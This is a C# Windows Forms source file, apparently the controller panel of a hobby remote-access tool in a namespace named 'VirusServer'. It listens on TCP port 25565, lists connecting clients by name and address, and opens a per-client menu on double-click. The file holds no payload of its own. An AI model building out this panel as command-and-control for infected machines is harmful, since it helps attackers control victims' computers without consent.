using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Net;

namespace VirusServer
{
    public partial class MainMenu : Form
    {
        public Thread refreshThread;
        public static Socket socket;
        public static List<Socket> SocketList = new List<Socket>();
        public static List<Client> ClientList = new List<Client>();
        public static bool closed = false;
        public MainMenu()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            IPHostEntry ipHostEntry = Dns.Resolve(Dns.GetHostName());
            IPAddress adress = ipHostEntry.AddressList[2];
            int port = 25565;
            IPEndPoint endPoint = new IPEndPoint(adress, port);
            socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(endPoint);
            socket.Listen(10);
            refreshThread = new Thread(WaitForConnection);
            refreshThread.Start();
        }

        public void WaitForConnection()
        {
            while (true)
            {
                if (!closed)
                {
                    Socket client = socket.Accept();
                    byte[] buffer = new byte[8196];
                    int bytesRecorded = client.Receive(buffer);
                    string name = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
                    ClientList.Add(new Client() { Name = name, IPEnd = client.RemoteEndPoint });
                    SocketList.Add(client);
                    Invoke((MethodInvoker)delegate { clientTable.DataSource = ClientList; });
                }
                else
                {
                    break;
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            closed = true;
            refreshThread.Abort();
        }

        private void clientTable_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            Socket cur = SocketList[e.RowIndex];
            ClientMenu clientMenu = new ClientMenu();
            clientMenu.socket = cur;
            clientMenu.Show();
        }
    }
}
